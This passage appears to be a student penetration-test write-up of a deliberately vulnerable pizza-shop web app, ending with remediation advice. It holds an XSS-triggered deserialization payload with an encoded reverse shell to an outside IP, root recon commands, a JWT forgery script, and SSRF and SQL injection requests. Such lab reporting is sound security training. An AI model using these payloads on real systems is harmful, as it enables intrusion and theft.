    `<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/object':'awefull_pizza_shop.webserver.schemas.PizzaCreation','name':{'py/reduce':[{'py/type':'subprocess.getoutput'},{'py/tuple':['echo $RANDOM; echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc= | base64 -d | bash &']}]},'description':'pwned','price':13.37,'image_url':'http://x','category':'MEAT'})});">`
    ![we have a reverse shell access](./exploitation/reverse_shell.png)
    ![we are root](./exploitation/root_reverse_shell.png)

- Exploit the shell:
  ![find / -perm -4000 -type f 2>/dev/null](./exploitation/suid_binaries.png)
  ![ps aux](./exploitation/ps_aux.png)
  ![whoami, id, hostname](./exploitation/whoami_id_hostname.png)
  ![etc/passwd](./exploitation/etc_passwd.png)
  ![env](./exploitation/env_vars.png)
  ![find / -maxdepth 3 -type f -name "*flag*" 2>/dev/null](./exploitation/find_flags.png)
  Flag: ![flag](./exploitation/flag_captured.png)

- Edit the db:
  ![install psql](./exploitation/psql_install.png)
  ![connect to DB](./exploitation/psql_connect.png)
  ![list users and change our permissions to admin](./exploitation/db_admin_perms.png)
  After exiting the shell:
  ![admin user](./exploitation/admin_user_verified.png)
  ![remove admin perm to admin](./exploitation/remove_admin_perm.png)
  ![pizza creation](./exploitation/pizza_creation.png)



---


&nbsp;  
&nbsp;  
### JWT Forgery
We found a hardcoded secret in the Docker file that is used to create JWTs (`JWT_SECRET_KEY=SuperSecretKeyThatIsTottalyNotRandom`), therefore we can create our own admin token following the same structure as in xss-poller and using the real admin username `admin_user`:  
```python
import jwt
import time

secret = "SuperSecretKeyThatIsTottalyNotRandom"
payload = {
    "sub": "username:admin_user",
    "role": "Admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(forged_token)
```
Which gives us `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTptYWlsIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc4ODYwNjkxLCJleHAiOjE3Nzg4NjQyOTF9.ivc8kYLIM9Vri_v72Vq_DvixTxWdQrDt8Bz_YXZ2dCk`.  
Then we can set the `access_token` in localStorage to the forged token and access the admin UI:
![admin access](./exploitation/admin_access.png)


&nbsp;  
### SSFR
In the DevTools Console:  
```javascript
fetch('https://app1.tiweb.tp.ubik.academy/api/pizza/create', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc5MDE2MzEwLCJleHAiOjE3NzkwMTk5MTB9.MdqDE82rEFrjWHldvlxtESpnQvCymDL3dusLAeT9VaY',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    "py/object": "awefull_pizza_shop.webserver.schemas.PizzaCreation",
    "name": "SSRF Test",
    "description": "Testing SSRF",
    "price": 10.0,
    "image_url": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
    "category": "MEAT"
  })
}).then(response => console.log("Status:", response.status));
```

**Note:** creating a pizza with an `image_url` that isn't an Url will cause a DoS on the server side since Pydantic validates each pizza before sending it to the front. If it doesn't start with http(s)://, it will throw an unhandled error.
![SSFR Script](./exploitation/ssfr_script.png)
![SSFR Pizza created](./exploitation/ssfr_pizza_created.png)
![SSFR hooked](./exploitation/ssfr_hooked.png.png)

&nbsp;  
### SQLi
```javascript
fetch("https://app1.tiweb.tp.ubik.academy/api/pizza/category/MEAT'%20OR%201=1--", {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc5MDE2MzEwLCJleHAiOjE3NzkwMTk5MTB9.MdqDE82rEFrjWHldvlxtESpnQvCymDL3dusLAeT9VaY'
  }
})
.then(response => response.json())
.then(data => console.log("SQLi Results Dump:", data));
```
Le résultat est un dump de toutes les pizzas, pas que de la catégorie MEAT, ce qui prouve que la requête SQL a été manipulée pour ignorer la condition de catégorie:  
```js
[
  {
    "name": "Margherita",
    "description": "Classic pizza with tomato sauce and cheese",
    "price": 9.99,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Margherita_Originale.JPG/280px-Margherita_Originale.JPG",
    "id": "76b6e243-f64e-4bae-8d5f-057d920bd893"
  },
  {
    "name": "Pepperoni",
    "description": "Pepperoni pizza with spicy sausage",
    "price": 12.49,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Pepperoni_Pizza_%2829204589095%29.jpg/220px-Pepperoni_Pizza_%2829204589095%29.jpg",
    "id": "47b991d9-1987-4c15-8543-e3c74f7b8d9d"
  },
  {
    "name": "Hawaiian",
    "description": "Pizza with ham and pineapple",
    "price": 11.99,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Pizza_Hawaii_02.jpg/643px-Pizza_Hawaii_02.jpg",
    "id": "edef3bfc-a744-4bb1-a22a-f0acef20a7af"
  },
  {
    "name": "Four Cheese",
    "description": "A pizza with mozzarella, cheddar, parmesan, and gorgonzola",
    "price": 13.5,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Pizza_quattro_formaggi_at_restaurant%2C_Chalk_Farm_Road%2C_London.jpg/280px-Pizza_quattro_formaggi_at_restaurant%2C_Chalk_Farm_Road%2C_London.jpg",
    "id": "326a8d0a-2722-46e0-bbbf-d3584bee3924"
  },
  {
    "name": "BBQ Chicken",
    "description": "Barbecue chicken with onions and peppers",
    "price": 14,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/B.B.Q._Chicken_Pizza_%2826679384893%29.jpg/800px-B.B.Q._Chicken_Pizza_%2826679384893%29.jpg?20181230000913",
    "id": "49df020b-d451-4aac-8817-64c6f3356805"
  },
  {
    "name": "Veggie Delight",
    "description": "A healthy pizza with a variety of fresh vegetables",
    "price": 10.5,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/Vegetarian_pizza.jpg/800px-Vegetarian_pizza.jpg",
    "id": "f0a43328-08d4-45c0-8359-8990c2ae69b9"
  },
  {
    "name": "Meat Feast",
    "description": "A pizza loaded with bacon, sausage, ham, and pepperoni",
    "price": 15.99,
    "imageUrl": "https://www.pizzalarocca.co.uk/wp-content/uploads/2021/09/meat-feast-pizza.jpg",
    "id": "3f90dce3-e775-4dda-9eac-f5b9a58d01bc"
  },
  {
    "name": "Buffalo Chicken",
    "description": "Buffalo chicken pizza with ranch dressing and mozzarella",
    "price": 14.5,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Buffalo_Chicken_Deep_Dish_Pizza.png/800px-Buffalo_Chicken_Deep_Dish_Pizza.png?20220120214314",
    "id": "59eecba1-956a-4ae8-bc96-feeabfc1cc90"
  },
  {
    "name": "Pesto Delight",
    "description": "A pesto-based pizza with mozzarella, tomatoes, and basil",
    "price": 12.99,
    "imageUrl": "https://www.casa-di-francesco.fr/wp-content/uploads/pesto.jpg",
    "id": "83c36f55-bc69-4998-9fc8-9b3435f1bdf0"
  },
  {
    "name": "Greek Special",
    "description": "Pizza with feta cheese, olives, spinach, and onions",
    "price": 13.75,
    "imageUrl": "https://pisapizza.ca/wp-content/uploads/2024/05/greek-pizza-21-001.jpg",
    "id": "e652ab47-7f93-483d-b7fb-f77993243665"
  },
  {
    "name": "Spicy Jalapeno",
    "description": "Pizza with jalapenos, spicy sausage, and chili flakes",
    "price": 11.49,
    "imageUrl": "https://www.vindulge.com/wp-content/uploads/2023/02/Pizza-with-Jalapeno-Coppa-and-Hot-Honey.jpg",
    "id": "e60cbb90-d86c-4250-99cc-9f1b9ba91a15"
  },
  {
    "name": "Seafood Special",
    "description": "A seafood pizza with shrimp, calamari, and mussels",
    "price": 16.5,
    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/Seafood_pizza_%281%29.jpg/800px-Seafood_pizza_%281%29.jpg",
    "id": "6619513c-67cc-48b0-9db0-c35184335358"
  },
  {
    "name": "SSRF Test",
    "description": "Testing SSRF",
    "price": 10,
    "imageUrl": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
    "id": "234b3a84-c76e-401d-8bb2-c493162edcb0"
  }
]
```
![Server response](./exploitation/sqli_server_response.png)
![SQL dump](./exploitation/sqli_sql_dump.png)

On remarque que le payload SSFR est bien présent.


&nbsp;  
### IDOR
attempting to GET or PUT against another user's UUID at the `/api/users/<uuid>`.  
the UUID were found with the RCE:  
| id                                   | name       | role  |
| ------------------------------------ | ---------- | ----- |
| e3d5bf4b-3301-4f23-b012-fab4c2bd407c | admin_user | ADMIN |
| 025a00bf-29dd-4f20-b0b3-dc7a5d0770bb | john_doe   | USER  |
| 4a861f02-bb37-414f-909c-b18b286daef7 | jane_doe   | USER  |
| e5bbae51-106c-4a2f-8816-03ba006c352b | mail       | ADMIN |


=> Mitigated
Description: Testing was conducted to identify Insecure Direct Object Reference (IDOR) vulnerabilities on the user profile endpoints. While the API utilizes UUIDs for user identification, the underlying source code dictates that the entire /users API router requires administrative privileges via the validate_user_admin dependency.
Evidence: When attempting to send GET or POST requests to /api/users/<target_uuid> using a standard user's JWT token, the server correctly rejected the requests with a 401 Unauthorized response before processing the UUID. Therefore, standard users cannot enumerate or modify other users' profiles, effectively mitigating the IDOR risk on this endpoint. It requires an admin token to access any user profile, which is a secure design choice to prevent unauthorized access. it's not IDOR since the endpoint is protected by an auth guard that checks for admin role before even looking at the UUID, so there's no direct reference to an object that can be manipulated by the user without proper authorization.

&nbsp;  
### Auth guard failure
![Auth guard failure](./exploitation/auth_guard_failure.png)
with a fake but invalid token.


---

&nbsp;  
&nbsp;  
## General Recommendations
- Remove all hardcoded secrets and use environment variables or secret management.
- Enforce strong JWT secrets and algorithms, and implement token rotation.
- Implement proper server-side authorization checks for all privileged actions.
- Implement rate limiting on authentication endpoints to prevent brute-force attacks.
- Enforce strict input validation and sanitization on all user inputs.
- Use secure cookie flags and enforce HTTPS to protect tokens in transit.
